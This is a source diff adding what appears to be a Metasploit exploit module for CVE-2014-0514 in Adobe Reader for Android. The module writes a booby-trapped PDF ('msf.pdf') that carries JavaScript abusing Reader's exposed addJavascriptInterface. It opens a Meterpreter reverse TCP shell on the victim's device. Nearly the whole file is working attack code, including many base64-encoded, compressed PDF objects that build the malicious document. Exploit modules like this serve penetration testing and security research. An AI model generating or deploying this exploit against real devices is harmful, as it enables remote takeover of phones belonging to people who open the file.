@@ -1,0 +1,137 @@
+##
+# This module requires Metasploit: http//metasploit.com/download
+# Current source: https://github.com/rapid7/metasploit-framework
+##
+
+require 'msf/core'
+require 'msf/core/exploit/fileformat'
+require 'msf/core/exploit/pdf'
+require 'msf/core/exploit/android'
+
+class Metasploit3 < Msf::Exploit::Remote
+  Rank = GoodRanking
+
+  include Msf::Exploit::FILEFORMAT
+  include Msf::Exploit::PDF
+  include Msf::Exploit::Android
+
+  def initialize(info = {})
+    super(update_info(info,
+      'Name'           => 'Adobe Reader for Android addJavascriptInterface Exploit',
+      'Description'    => %q{
+          Adobe Reader versions less than 11.2.0 exposes insecure native
+          interfaces to untrusted javascript in a PDF. This module embeds the browser
+          exploit from android/webview_addjavascriptinterface into a PDF to get a
+          command shell on vulnerable versions of Reader.
+      },
+      'License'        => MSF_LICENSE,
+      'Author'         => [
+        'Yorick Koster', # discoverer
+        'joev' # msf module
+      ],
+      'References'     =>
+        [
+          [ 'CVE', '2014-0514' ],
+          [ 'EDB', '32884' ],
+          [ 'OSVDB', '105781' ],
+        ],
+      'Platform'       => 'android',
+      'DefaultOptions' => {
+        'PAYLOAD' => 'android/meterpreter/reverse_tcp'
+      },
+      'Targets'        => [
+        [ 'Android ARM', {
+            'Platform' => 'android',
+            'Arch' => ARCH_ARMLE
+          }
+        ],
+        [ 'Android MIPSLE', {
+            'Platform' => 'android',
+            'Arch' => ARCH_MIPSLE
+          }
+        ],
+        [ 'Android X86', {
+            'Platform' => 'android',
+            'Arch' => ARCH_X86
+          }
+        ]
+      ],
+      'DisclosureDate' => 'Apr 13 2014',
+      'DefaultTarget'  => 0
+    ))
+
+    register_options([
+      OptString.new('FILENAME', [ true, 'The file name.',  'msf.pdf']),
+    ], self.class)
+  end
+
+  def exploit
+    print_status("Generating Javascript exploit...")
+    js = add_javascript_interface_exploit_js(ARCH_ARMLE)
+    print_status("Creating PDF...")
+    file_create(pdf(js))
+  end
+
+  def trailer(root_obj)
+    id = @xref.keys.max+1
+    "trailer" << eol << "<</Size %d/Root " % id << ioRef(root_obj) << ">>" << eol
+  end
+
+  def add_compressed(n, data)
+    add_object(n, Zlib::Inflate.inflate(Rex::Text.decode_base64(data)))
+  end
+
+  def pdf(js)
+    self.eol = "\x0d"
+    @xref = {}
+    @pdf = header('1.6')
+
+    add_compressed(25, "eJzjtbHRd0wuynfLL8pVMDFQMFAI0vdNLUlMSSxJVDAGc/0Sc1OLFYyNwBz/0pKczDwg3xzMDUhMB7INzcCc4ILMlNQiz7y0fAUjiOrgkqLS5JKQotTUoPz8EgVDiPkhlQWp+s5AC3Ly0+3seAG6CSa9")
+    add_compressed(40, "eJzjtbHRd3HU0PdIzSlTMFAISQMS6Qqa+i5BQAnXvOT8lMy8dCAzwMXNJT8ZJqBgYgpUF2Rnp++Wn1cClPZIdcpXMLYECUKMMjEHs6MSXZIUTCwgikHKM1NzUoqjjcEisXZ2vADEuSJw")
+    add_compressed(3, "eJztV91umzAUfoK8g8UuN2OMIQkWUFWJplUqU7VGam+N7aSs/AmMQvtqvdgj7RVmEpKRNJp2M2kXWAjZ+Hzfd3zO4Uie+D66lflGPQFCMEH3TaxeSokeo1u06iaRVEwwxcKwVpVk2cS/akvGn6UCsdwkeWD8fPthgEQExoMbWVG5kE/Jl9dK3r9+XfHXZ+4J4yqc+C1tszLTZKDN0rymbWAwUcSS6nn3GRlgZ6KeA+O62wCP0R1YFJUErulAblkumM1N7MyIPf0EbAvbyJojm0BMqNU9oB9GONFvvxJr+m35uZfTq8B4UqqkCG23W3NLzKLaIOx5HrJsZNtQW8D6JVeshXn9YU9y4FnKmldJqZIiB92axUWjAsOYgMHoz5WVR6G8NndnNHmRoZaVCJsWugQS/IgpmyrduSY4kqnMZK5qjcMXcVosiv4sl2UXkeUgHic4vaFxBB0D0MVA69CoEMn6ZcmUDHXwHWi5kOAVtil2qD3VS2pZPjqzPONY6ApScsBBdhyEEpe6+KNlHzkGlud+9AX5V54MbS/5UlSrokjDfcFd86qImQJYx23gRW8zgAtO10WVMRWyskwTzrrC6CLno99bp/YqUenQhUNlXafq9OthI026TNGU5ZvAaKGQa9akygi/16ZqlY/2NmeM6D3lzqVzdX9XOHRZ8KYrsJtl2DSJoJ6Yu1NPSjhbizl0nJhBj885nErXtl3iejFzd4E5xb7jvclrxXIuD7wOn1nONNaZcjwCPcuJIXNdGwqOZ3ObxySO8YF3gB3w6tjSu6oQDZdVeMjTg4zBgpWq0T1in7MTs8kwKIM/eN8eUN8fdGtCx970LhX/ZIwio8goMoqMIqPIKPJfiQxuNzLXV5ptd3fRs/7u8wtzq37r")
+    add_compressed(32, "eJzjtbHR93QJVjA0VzBQCNIPDfIBsi1AbDs7XgBc3QYo")
+    add_compressed(7, "eJzjtbHRd84vzStRMNJ3yywqLlGwUDBQCNL3SYQzQyoLUvX9S0tyMvNSi+3seAF54Q8a")
+    add_compressed(16, "eJzjtbHRd84vzStRMNT3zkwpjjYyUzBQCIrVD6ksSNUPSExPLbaz4wUA0/wLJA==")
+    add_compressed(22, "eJzjtbHRD1Mw1DMytbPjBQARcgJ6")
+    add_compressed(10, "eJzjtbHRd85JLC72TSxQMDRUMFAI0vdWMDQCMwISi1LzSkKKUlMVDI3RRPxSK0q8UysVDPVDKgtS9YNLikqTwRJB+fkldna8AIaCG78=")
+    add_compressed(11, "eJzjtbHRDy5IKXIsKgGy/PXDU5OcEwtKSotS7YCAFwCW+AmR")
+    add_compressed(12, "eJzjtbHR91YwNFUwUAjSD1AwNAAzgvVd8pNLc1PzSuzseAGGCwiD")
+    add_compressed(13, "eJzjtbHR9yvNLY42UDA0UTBQCIq1s+MFADohBRA=")
+    add_compressed(14, "eJzjjTY0VTBQCFKAULG8ABzfA0M=")
+    add_compressed(15, "eJzjtbHRd9YPLkgpciwq0feONlAwjNUPUDA0UjBQCNIPSFcwMgOzgvWB8pnJOal2drwAYtsNjA==")
+    add_compressed(26, "eJx1jk0KwkAMhU/QO+QEnRmnrQiloBXEhVBaV4qLoQ0iyGSYH9Dbm7ZrAwn54L2XZHUt9tZSDFAokNCLlmxEy1wWK3tyB/rcZS5h7kpteG53PB/i5Ck50KvyfARdLtsFp5f5a+puoHIpOuP5DqhqsfQYKPkRAz/U0pv84MyIMwwStJ41DZfoKZqIIMUQfRrjGhKYr1+HnPnEpsl+Bag7pA==")
+    add_compressed(41, "eJzjjTa2UDBQCIrlBQAKzAIA")
+    add_compressed(54, "eJwBzwAw/w08PC9GaWx0ZXIvRmxhdGVEZWNvZGUvTGVuZ3RoIDE1ND4+c3RyZWFtDUiJXE7BDcIwFLv3K/IFvlatYzAG66bgYSDM2/BQa6cDXWV7gv69m7d5SEISCKGs57axjpEklDFbd/MX1GQCc3jgRMaEN2oNDSVHrMeoep358/SgXQjse9Dx5w722naW29AhTU2RQ2zLkSivJNwABQyuE0pitYGO1SLSiJbxJL0XjaDpibv76UiZ7wvI+cx/rWb1V4ABAMukNiwNZW5kc3RyZWFtDcyfYBU=")
+    add_compressed(34, "eJzjtbHRdw5WMDZTMFAI0g/WDylKzCsuSCxKzUuutLPjBQB75gjK")
+    add_compressed(35, "eJzj1ZA6peCnxVrNzHD3v1xSmdpmTV4AOosGFg==")
+    add_compressed(33, "eJzjjdb3dHZ2SixOTVEwslQwUAiK5QUANnUE/Q==")
+    add_compressed(29, "eJwBEQHu/g08PC9GaWx0ZXIvRmxhdGVEZWNvZGUvTGVuZ3RoIDIxNi9OIDE+PnN0cmVhbQ1IiWJgYJzh6OLkyiTAwJCbV1LkHuQYGREZpcB+noGNgZkBDBKTiwscAwJ8QOy8/LxUBgzw7RoDI4i+rAsyC1MeL2BNLigqAdIHgNgoJbU4GUh/AeLM8pICoDhjApAtkpQNZoPUiWSHBDkD2R1ANl9JagVIjME5v6CyKDM9o0TB0NLSUsExJT8pVSG4srgkNbdYwTMvOb+oIL8osSQ1BagWagcI8LsXJVYquCfm5iYqGOkZkehyIgAoLCGszyHgMGIUO48QQ4Dk0qIyKJORyZiBASDAAEnGOC8NZW5kc3RyZWFtDYkear8=")
+    add_compressed(36, "eJzjjdb3dHZ2SixOTVEwNlAwUAiK5QUANj4E9Q==")
+    add_compressed(30, "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")
+    add_compressed(38, "eJxNjbEOgjAYhJ+Ad/hHWPgplIoJaVIwaGIwRGsciAtYCFGLQx18e1vi4HDDXe6+8/IcBdAEIjiiaKw7QEqc4xw3wsedKmYgMcjBhmOAFVCsJBZGYzUAS9OEYb23u2LbkjCCn65YCr98TP0dnipA2QCxwAZitjwdVW/ayFajkBGasQwYIWGSUVitY7c+vTvzeSm8TLdRGZR+Z/SCqx3t/I92NaH1bDj3vvt1NZc=")
+    add_compressed(43, "eJzjtbHR9wpWMDFTMFAI0g/W90osSwxOLsosKLGz4wUAaC0Hzw==")
+    add_compressed(51, "eJxNjtEKgkAQRb9g/mG/wHHRTEF8kPCpyDIoEB/UJivQrXUF+/t2Y4seLnPhzj1ciGNMUzGXruMyo4Bzxwt9tozMXVSYCdkfXg9iHNc0dOrKAh83tZK3ueS2ZPTnK9zTKCbZ0qjxuRRtQarEfJVVSYLF1CjN+4DRkPG0be7UqiQZlaS6B8460CC7xQu/YziTBBd46gfOAjeyYRj9wiMMsAMazpb0BnLmPE4=")
+
+    js = Zlib::Deflate.deflate(js)
+    add_object(46, "\x0d<</Filter[/FlateDecode]/Length #{js.length}>>stream\x0d#{js}\x0dendstream\x0d")
+
+    add_compressed(8, "eJzjtbHRd84vzStRMNR3yywqLlGwVDBQCNL3SYQzAxKLUoHy5mBOSGZJTqqGT35yYo6CS2ZxtqadHS8AmCkTkg==")
+    add_compressed(9, "eJzjtbHRd0ktLok2MlMwUAjSj4iMAtLmlkYKeaU5ObH6AYlFqXklChZgyWBXBUNTMCsksyQnVePff4YshmIGPYYShgqGEk07O14AWScVgw==")
+    add_compressed(17, "eJzjtbHR90vMTS2ONjZVMFAIUjAyAFGxdna8AF4CBlg=")
+    add_compressed(18, "eJzjtbHR90vMTS2ONrRUMFAIUjAyAFGxdna8AF4gBlo=")
+    add_compressed(19, "eJzj1UjLzEm10tfXd67RL0nNLdDPKtYrqSjR5AUAaRoIEQ==")
+    add_compressed(20, "eJzjtbHRdw7RKEmtKNEvyEnMzNPU93RRMDZVMFAI0vePNjIDMWL1g/WDA4DYU8HIECwTovHvP0MWQzGDHkMJQwVDiaZ+SLCGi5WRgaGJgbGxoaGhsampUZSmnR0vAOIUGEU=")
+    add_compressed(21, "eJzjtbHRdwxVMLRUMFAI0g8J1nCxMjIwNDEwNjY0NDQ2NTWK0rSz4wUAmbEH3g==")
+    add_compressed(39, "eJzjtbHRd0osTnXLzyvR90jNKUstyUxO1HXKz0nRd81Lzk/JzEtXMDFVMFAI0vdLzE0FqnHK1w8uTSqpLEjVDwEShmBSH2SAnR0vACeXGlQ=")
+    add_compressed(47, "eJzjtbHRd0osTnXLzyvR90jNKUstyUxO1HfNS85PycxLVzAxVTBQCNL3S8xNBUvrB5cmlVQWpOqHAAlDMKkP0mtnxwsAqd8Y1w==")
+    add_compressed(48, "eJzjtbHRd0osTnXLzyvRj0osSHPJzEtPSiwp1vdLzE0Firgk6QeXJpVUFqTqhwAJQzCpD1JuZ8cLAJhsFTA=")
+    add_compressed(45, "eJxNk81u2zAMx5+g75AnGJe0yFKgKGB0PgQYlsOaQzfswEi0LUSWUn1ky55+tJiovkQm+f+RFMXcPT3BV9N1FMgpir9WD3AIdCZQGLwDZYLKY2fpL2ifUClyCYbsegx5tJgT+N47OkIwrodkrKbF/SO8Z58ossvS4nENfcAzLZarDRyytZRAY99TuB76YIGsNadoItCoMQ5Arhyd9ZwYuoAqGW6nz8aWtJa69GEF0w8JRuNyhBOFNPgc0Wlpg9MfMFI1CnozhCzWh3/mLOkLngJqGjEcoTPcF3yLdupw18IPGdWbNjzE6Q4/xcEDsxSjAStSTxAl8q8ci+X6M7Q5eP54AJXD9AQXNtb8BP5I7oCBrQ3UxMqfLtKcD7ojvrBxPNcvK7C+Nwqt8wk+8Y+mDgL1JvJlSMOIqjREfSCCk81RZpX++Jh5YMYHSAPHqoUqJ4IxL5abeyg+PT19yaZIG2sR+N2rnvsZMapsS0ObzRR8zxiYmD4HtJ1UuDrjYvm4gqYsBjRSrZktW1NWCZp69aYsWNPCy618K3ArcDuD20ptRbMVzXam2VZNmwb4LuV2It+JfDeT766CSo3ZJnOyF9jJ4+4F3Qu6n6H7yrxJ8HXwgVeZwsg7erARUFiUMM5YlLJYU2AZA/Lf8zYGEpgEphlMlTKiMaIxM42pGuIxOCnnRe5F7mdyfxVUSpuzmRwyhCxgFjDPwFyJiwRTGcLl5v4Nr5cTv6JTnNv1z893/wElCbzZ")
+    add_compressed(23, "eJxNzLEKgzAQgOEn8B2ymVCqd4npUEQQXQsdCp0Tc4Ol9Ep6Qh+/gg7d/+8v2rYeMgWZ+TUGIT2eLWADziE65z0ewJYApdkqzrpPHEn1U+YYRCFWYOoLp3/sV2yxsacj+A1fM6dlolXv7k5RDeEtS6b9cZvlSfrxqeQrpuuKH+VYK70=")
+
+    @xref_offset = @pdf.length
+    @pdf << xref_table << trailer(25) << startxref
+
+    @pdf
+  end
+
+end
